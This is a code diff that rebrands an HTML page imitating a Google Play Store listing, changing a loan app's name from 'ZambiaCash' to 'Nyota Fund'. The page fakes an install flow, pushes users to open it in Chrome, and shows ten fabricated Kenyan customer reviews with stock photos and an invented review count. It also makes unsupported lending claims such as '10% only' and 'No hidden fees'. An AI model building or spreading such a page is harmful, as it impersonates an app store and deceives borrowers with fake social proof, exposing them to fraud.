@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>ZambiaCash</title>
-    <meta name="theme-color" content="#1E40AF">
+    <title>Nyota Fund</title>
+    <meta name="theme-color" content="#2E7D32">
     <link rel="manifest" href="manifest.json">
-    <link rel="apple-touch-icon" href="icon.png">
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -14,7 +13,14 @@
         tailwind.config = {
             theme: { extend: {
                 fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] },
-                colors: { brandBlue: '#1E40AF', brandLight: '#3B82F6', brandYellow: '#F59E0B', playBlue: '#0056D2', playGreen: '#01875f' },
+                colors: { 
+                    brandGreen: '#2E7D32',   
+                    brandLightGreen: '#4CAF50',
+                    brandRed: '#D32F2F',     
+                    brandBlack: '#1A1A1A',   
+                    playBlue: '#0056D2', 
+                    playGreen: '#01875f' 
+                },
                 boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' }
             } }
         }
@@ -24,9 +30,9 @@
         .screen { display: none; flex-direction: column; min-height: 100vh; }
         .screen.active { display: flex; animation: screenIn 0.35s ease-out; }
         @keyframes screenIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-        .gradient-bg { background: linear-gradient(160deg, #0F172A 0%, #1E40AF 100%); }
         
-        /* Native App Inputs */
+        .gradient-bg { background: linear-gradient(160deg, #121212 0%, #2E7D32 100%); }
+        
         input { 
             width: 100%; 
             padding: 1.2rem 1.1rem; 
@@ -39,16 +45,18 @@
             background: #F8FAFC; 
             font-family: inherit; 
         }
-        input:focus { border-color: #1E40AF; background: #FFFFFF; box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.08); }
+        input:focus { border-color: #2E7D32; background: #FFFFFF; box-shadow: 0 0 0 4px rgba(46, 125, 50, 0.08); }
         
         .amount-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 700; color: #475569; background: #FFFFFF; font-size: 15px; padding: 16px 0; }
-        .amount-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 6px 16px -4px rgba(30, 64, 175, 0.4); }
+        .amount-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; box-shadow: 0 6px 16px -4px rgba(46, 125, 50, 0.4); }
         
         .term-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 600; color: #475569; background: #FFFFFF; font-size: 14px; padding: 16px; }
-        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; }
+        .term-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; }
         
         .hide-scrollbar::-webkit-scrollbar { display: none; }
-        .star { color: #FBBF24; }
+        
+        /* CHANGED: Blue stars */
+        .star { color: #0056D2; }
         
         .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; overflow: hidden; flex-shrink: 0; background-color: #E2E8F0; }
         .review-avatar img { width: 100%; height: 100%; object-fit: cover; }
@@ -60,11 +68,10 @@
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
         .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
 
-        /* NATIVE APP FEEL */
         .app-shell { background: #F7F8FA; min-height: 100vh; }
         .native-card { background: #FFFFFF; border-radius: 22px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04), 0 8px 24px -8px rgba(15, 23, 42, 0.08); }
-        .native-btn { background: #1E40AF; color: #fff; border: none; border-radius: 14px; padding: 18px 24px; min-height: 56px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
-        .native-btn:active { transform: scale(0.97); background: #1a3a9e; }
+        .native-btn { background: #2E7D32; color: #fff; border: none; border-radius: 14px; padding: 18px 24px; min-height: 56px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
+        .native-btn:active { transform: scale(0.97); background: #1B5E20; }
         .native-btn:disabled { opacity: 0.5; }
         
         .app-bar { display: flex; align-items: center; padding: 20px 20px 12px; gap: 12px; }
@@ -86,7 +93,6 @@
         .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
         @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
 
-        /* REALISTIC NATIVE SPLASH SCREEN */
         #splash-screen { transition: opacity 0.4s ease-out; }
     </style>
 </head>
@@ -94,7 +100,7 @@
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
-<!-- OFFLINE GATE (Global Overlay) -->
+<!-- OFFLINE GATE -->
 <div id="offline-gate" class="hide fixed inset-0 z-[110000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
     <div class="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6">
         <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -102,8 +108,8 @@
         </svg>
     </div>
     <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
-    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection to process your loan.</p>
-    <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">Nyota Fund requires an active internet connection to process your loan.</p>
+    <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
 </div>
 
 <!-- PLAY STORE THEMED WARNING -->
@@ -117,8 +123,8 @@
         </svg>
     </div>
     <h2 class="text-2xl font-bold text-white mb-2 font-sans">Open in Play Store</h2>
-    <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">To download ZambiaCash, you must open this link in Google Chrome to access the Play Store.</p>
-    <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3 font-sans flex items-center justify-center gap-2">
+    <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">To download Nyota Fund, you must open this link in Google Chrome to access the Play Store.</p>
+    <button onclick="openInChrome()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl mb-3 font-sans flex items-center justify-center gap-2">
         Open in Chrome
     </button>
     <button onclick="copyLinkAndShowHelp()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
@@ -134,11 +140,11 @@
         <div class="flex gap-4 mb-6">
             <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
                 <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10"><circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/><circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/></svg>
-                <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="ZambiaCash">
+                <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="Nyota Fund">
             </div>
             <div class="flex flex-col justify-center">
-                <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
-                <p class="text-playBlue font-semibold text-sm mt-1">ZambiaCash Financial</p>
+                <h1 class="text-2xl font-bold text-gray-900 leading-tight">Nyota Fund</h1>
+                <p class="text-brandGreen font-semibold text-sm mt-1">Nyota Fund Financial</p>
                 <p class="text-gray-500 text-xs mt-1">Contains ads</p>
             </div>
         </div>
@@ -150,7 +156,6 @@
             </div>
         </div>
         
-        <!-- INSTALL BUTTONS -->
         <div class="flex gap-2 mb-6" id="pre-install-buttons">
             <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
@@ -159,13 +164,11 @@
             <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
         </div>
         
-        <!-- POST INSTALL BUTTONS -->
         <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
             <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
             <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
         </div>
 
-        <!-- INSTALLED PROMPT -->
         <div id="installed-prompt" class="hide mb-6 transition-all duration-300 opacity-0 -translate-y-2">
             <div class="bg-[#1e1e1e] rounded-2xl p-5 flex flex-col gap-3 shadow-lg border border-gray-700 w-full relative overflow-hidden">
                 <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-400 to-yellow-600"></div>
@@ -173,7 +176,7 @@
                     <img src="icon.png" class="w-12 h-12 rounded-xl object-cover">
                     <div>
                         <p class="text-white font-bold text-base">App is installed</p>
-                        <p class="text-gray-400 text-xs mt-0.5">Find the ZambiaCash icon on your home screen.</p>
+                        <p class="text-gray-400 text-xs mt-0.5">Find the Nyota Fund icon on your home screen.</p>
                     </div>
                 </div>
                 <div class="bg-yellow-400/10 border border-yellow-400/20 rounded-xl p-3 text-center mt-1">
@@ -182,7 +185,6 @@
             </div>
         </div>
 
-        <!-- THE REST OF THE CONTENT -->
         <div id="post-install-content" class="hide">
             <div class="mb-8 border-t border-gray-100 pt-6">
                 <h3 class="font-bold text-xl text-gray-900 mb-2">What's new</h3>
@@ -193,11 +195,12 @@
                 <h3 class="font-bold text-xl mb-1 text-gray-900">Rate this app</h3>
                 <p class="text-sm text-gray-500 mb-6">Tell others what you think</p>
                 <div class="flex justify-between items-center mb-6 px-2">
-                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(1)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(2)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(3)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(4)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(5)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <!-- CHANGED: Stars to text-playBlue -->
+                    <svg class="rate-star w-9 h-9 text-playBlue cursor-pointer" onclick="setRating(1)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-playBlue cursor-pointer" onclick="setRating(2)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-playBlue cursor-pointer" onclick="setRating(3)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-playBlue cursor-pointer" onclick="setRating(4)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-playBlue cursor-pointer" onclick="setRating(5)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
                 </div>
                 <button id="btn-write-review" class="text-playBlue font-semibold text-sm">Write a review</button>
             </div>
@@ -211,13 +214,13 @@
                 <div class="flex-1 flex flex-col items-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div><span class="text-[11px] text-gray-600">Rated for 12+</span></div>
             </div>
             <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
-                <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
-                    <div><p class="text-blue-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p><p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p></div>
-                    <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20"><p class="text-white text-sm font-bold">Instant Disbursement</p><p class="text-blue-100 text-[11px] mt-1">Straight to M-Pesa</p></div>
+                <div class="w-44 h-80 bg-gradient-to-br from-brandGreen to-brandLightGreen rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
+                    <div><p class="text-green-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p><p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p></div>
+                    <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20"><p class="text-white text-sm font-bold">Instant Disbursement</p><p class="text-green-100 text-[11px] mt-1">Straight to M-Pesa</p></div>
                 </div>
                 <div class="w-44 h-80 bg-white border border-gray-200 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
-                    <div><p class="text-gray-400 text-[11px] font-bold tracking-widest uppercase">Interest Rates</p><p class="text-brandBlue text-4xl font-extrabold mt-2">10%</p><p class="text-gray-500 text-sm font-medium mt-1">Only</p></div>
-                    <div class="bg-blue-50 rounded-xl p-4 border border-blue-100"><p class="text-brandBlue text-sm font-bold">Low Cost</p><p class="text-gray-500 text-[11px] mt-1">No hidden fees</p></div>
+                    <div><p class="text-gray-400 text-[11px] font-bold tracking-widest uppercase">Interest Rates</p><p class="text-brandGreen text-4xl font-extrabold mt-2">10%</p><p class="text-gray-500 text-sm font-medium mt-1">Only</p></div>
+                    <div class="bg-green-50 rounded-xl p-4 border border-green-100"><p class="text-brandGreen text-sm font-bold">Low Cost</p><p class="text-gray-500 text-[11px] mt-1">No hidden fees</p></div>
                 </div>
                 <div class="w-44 h-80 bg-emerald-500 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                     <div><p class="text-emerald-100 text-[11px] font-bold tracking-widest uppercase">Approval Time</p><p class="text-white text-4xl font-extrabold mt-2">2 Min</p></div>
@@ -239,7 +242,6 @@
                 </div>
             </div>
             
-            <!-- SPONSORED (ONLY JUMIA) -->
             <div class="mb-8 border-t border-gray-100 pt-8">
                 <div class="flex justify-between items-center mb-4">
                     <h3 class="font-bold text-xl text-gray-900">Sponsored <span class="font-normal text-gray-500 text-sm mx-1">•</span> Suggested for you</h3>
@@ -260,7 +262,6 @@
                 </div>
             </div>
 
-            <!-- RATINGS AND REVIEWS (10 NATURAL KENYAN REVIEWS) -->
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-4">Ratings and reviews</h3>
                 <div class="flex gap-4 items-center mb-8">
@@ -274,9 +275,7 @@
                     </div>
                 </div>
 
-                <!-- INITIAL VISIBLE REVIEWS -->
                 <div class="space-y-7">
-                    <!-- Review 1 (Black Man) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1506277886164-e25aa3f4ef7f?w=100&h=100&fit=crop" alt="Brian"></div>
@@ -286,17 +285,15 @@
                         <p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Very reliable.</p>
                     </div>
                     
-                    <!-- Review 2 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=100&h=100&fit=crop" alt="Faith"></div>
                             <div><p class="text-sm font-semibold">Faith Wanjiku</p><p class="text-[11px] text-gray-500">3 days ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">Pesa imeingia haraka sana. Asante ZambiaCash kwa huduma bora. Interest rates ziko poa.</p>
+                        <p class="text-sm text-gray-600 leading-relaxed">Pesa imeingia haraka sana. Asante Nyota Fund kwa huduma bora. Interest rates ziko poa.</p>
                     </div>
                     
-                    <!-- Review 3 (Black Man - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1589156280159-27698a70f29e?w=100&h=100&fit=crop" alt="Kelvin"></div>
@@ -306,20 +303,17 @@
                         <p class="text-sm text-gray-600 leading-relaxed">App ni fire, pesa imeingia haraka sana. Keep up! Hakuna usumbufu.</p>
                     </div>
 
-                    <!-- Review 4 (Black Woman - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1523824921871-d6f1a15151f1?w=100&h=100&fit=crop" alt="Mercy"></div>
                             <div><p class="text-sm font-semibold">Mercy Chebet</p><p class="text-[11px] text-gray-500">1 week ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">I was skeptical at first but it really works. The customer service is also very helpful. Keep it up ZambiaCash!</p>
+                        <p class="text-sm text-gray-600 leading-relaxed">I was skeptical at first but it really works. The customer service is also very helpful. Keep it up Nyota Fund!</p>
                     </div>
                 </div>
 
-                <!-- HIDDEN REVIEWS CONTAINER -->
                 <div id="more-reviews" class="space-y-7 hide mt-7">
-                    <!-- Review 5 (Black Man - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #0D9488;">P</div>
@@ -329,17 +323,15 @@
                         <p class="text-sm text-gray-600 leading-relaxed">Nimepata loan yangu within 2 mins, wacha niwaipepo. M-Pesa imekam instantly.</p>
                     </div>
 
-                    <!-- Review 6 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.pexels.com/photos/35670147/pexels-photo-35670147.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
                             <div><p class="text-sm font-semibold">Alice Njeri</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">Hii app ni safi sana, hakuna usumbufu. Loan yangu ilikuja haraka. Watu wa ZambiaCash mko poa.</p>
+                        <p class="text-sm text-gray-600 leading-relaxed">Hii app ni safi sana, hakuna usumbufu. Loan yangu ilikuja haraka. Watu wa Nyota Fund mko poa.</p>
                     </div>
 
-                    <!-- Review 7 (Black Man - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.pexels.com/photos/31712654/pexels-photo-31712654.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
@@ -349,7 +341,6 @@
                         <p class="text-sm text-gray-600 leading-relaxed">The app is good and fast. It crashed once when I was applying but after reloading it worked perfectly. M-Pesa is fast.</p>
                     </div>
 
-                    <!-- Review 8 (Black Woman - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.pexels.com/photos/20607376/pexels-photo-20607376.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
@@ -359,7 +350,6 @@
                         <p class="text-sm text-gray-600 leading-relaxed">Kujeni muone hii app, loan imeingia instantly na interest ni poa. Best app ever.</p>
                     </div>
 
-                    <!-- Review 9 (Black Man - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #0D9488; color: white; display:flex; align-items:center; justify-content:center; font-weight:600;">J</div>
@@ -369,24 +359,22 @@
                         <p class="text-sm text-gray-600 leading-relaxed">Best loan app so far. No hidden charges and the M-Pesa prompt comes instantly. Thank you for the quick service.</p>
                     </div>
 
-                    <!-- Review 10 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #D97706; color: white; display:flex; align-items:center; justify-content:center; font-weight:600;">S</div>
                             <div><p class="text-sm font-semibold">Sharon Achieng</p><p class="text-[11px] text-gray-500">2 months ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">Nimefurahi sana. Loan yangu ilikuja haraka. Watu wa ZambiaCash mko poa. Mungu awabariki.</p>
+                        <p class="text-sm text-gray-600 leading-relaxed">Nimefurahi sana. Loan yangu ilikuja haraka. Watu wa Nyota Fund mko poa. Mungu awabariki.</p>
                     </div>
                 </div>
 
-                <!-- TOGGLE BUTTON -->
                 <button id="btn-see-all" onclick="toggleReviews()" class="text-playBlue font-semibold text-sm mt-6 block">See all 12,432 reviews</button>
             </div>
 
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-lg text-gray-900 mb-3">About the developer</h3>
-                <div class="text-sm text-gray-600 space-y-1"><p class="font-semibold text-gray-900">ZambiaCash Financial Services</p><p>support@zambiacash.com</p><p>Nairobi, Kenya</p></div>
+                <div class="text-sm text-gray-600 space-y-1"><p class="font-semibold text-gray-900">Nyota Fund Financial Services</p><p>support@nyotafund.com</p><p>Nairobi, Kenya</p></div>
             </div>
         </div>
     </div>
@@ -398,9 +386,9 @@
 </div>
 
 <!-- NATIVE SPLASH SCREEN -->
-<div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#1E40AF] flex flex-col items-center justify-center opacity-0 transition-opacity duration-300">
-    <img src="icon.png" class="w-24 h-24 rounded-3xl object-cover mb-4 shadow-lg border border-white/10" alt="ZambiaCash">
-    <h1 class="text-white text-xl font-bold tracking-wide font-sans">ZambiaCash</h1>
+<div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#2E7D32] flex flex-col items-center justify-center opacity-0 transition-opacity duration-300">
+    <img src="icon.png" class="w-24 h-24 rounded-3xl object-cover mb-4 shadow-lg border border-white/10" alt="Nyota Fund">
+    <h1 class="text-white text-xl font-bold tracking-wide font-sans">Nyota Fund</h1>
 </div>
 
 <!-- ============ APP CONTENT ============ -->
@@ -411,8 +399,8 @@
         <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
             <div class="text-center mb-8">
                 <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
-                <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
-                <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
+                <h1 class="text-white text-3xl font-extrabold tracking-tight">Nyota Fund</h1>
+                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Kuza, Imarisha, Endeleza Vijana</p>
             </div>
